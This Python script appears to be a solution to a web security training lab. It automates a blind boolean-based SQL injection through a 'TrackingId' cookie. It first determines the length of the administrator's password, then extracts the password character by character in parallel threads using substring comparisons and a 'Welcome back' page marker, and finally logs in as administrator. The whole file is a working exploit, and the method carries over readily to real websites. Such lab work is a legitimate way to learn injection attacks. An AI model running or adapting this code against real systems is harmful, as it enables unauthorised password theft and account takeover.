import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}] [{name}] {message}",
    style = "{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
AVAIL_CHARS = string.printable 
MAX_LENGTH = 100
def format_length_query(inner_query, length):
    return f"xyz' or (select length(({inner_query}))={length})-- "


def format_char_query(inner_query, index, char):
    return f"xyz' or (Select substring(({inner_query}), {index}, 1)=chr({char}))-- "


def is_true(resp):
    if "Welcome back" in resp.text:
        return True
    return False


def format_request(url, outer_query):
    cookies = {
        "TrackingId": outer_query,
    }    
    request = requests.Request("GET", url, cookies=cookies)
    prepped = request.prepare()
    return prepped

#here
def determine_response_length(inner_query, url, no_proxy=False):
    log.info("determinging response length")
    sess = requests.Session()
    for i in range(1, MAX_LENGTH):
        outer_query = format_length_query(inner_query, i)
        prepped = format_request(url, outer_query)
        if no_proxy:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            response_length = i
            log.info(f"Length of query response is {response_length}")
            return i


def determine_response_char(task):
    sess = requests.Session()
    chars = [ord(x) for x in AVAIL_CHARS]
    for x in chars:
        outer_query = format_char_query(task["inner_query"], task["position"], x)
        prepped = format_request(task["url"], outer_query)
        if task["no_proxy"]:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp): #he
            task["result"] = str(chr(x))
            return task

def format_results(response_chars):
    results = [
        res["result"] for res in sorted(response_chars, key=lambda item: item["position"])
    ]
    return "".join(results)



def get_response_string(inner_query, url, no_proxy, num_threads):
    response_lenght = determine_response_length(inner_query, url, no_proxy) #here
    if response_lenght is None:
        log.error("Couldn't determine response length.")
        sys.exit()
    if num_threads > response_lenght:
        num_threads = response_lenght
    tasks = []
    for i in range(1, response_lenght + 1):
        result = {
            "position": i,
            "url": url, 
            "no_proxy": no_proxy, 
            "inner_query": inner_query,
            }
        tasks.append(result)    
    response_chars = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        results = [executor.submit(determine_response_char, task) for task in tasks]
        for f in concurrent.futures.as_completed(results):
            response_chars.append(f.result())
    return format_results(response_chars)       

def main(args):
    num_threads = 8
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    inner_query = "SELECT password from users where username = 'administrator'"
    respone_string = get_response_string(
        inner_query, shop.base_url, shop.no_proxy, num_threads
        )
    log.info(f"Response is: {respone_string}")
    shop.login("administrator", respone_string)
    shop.is_solved()
if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
    
    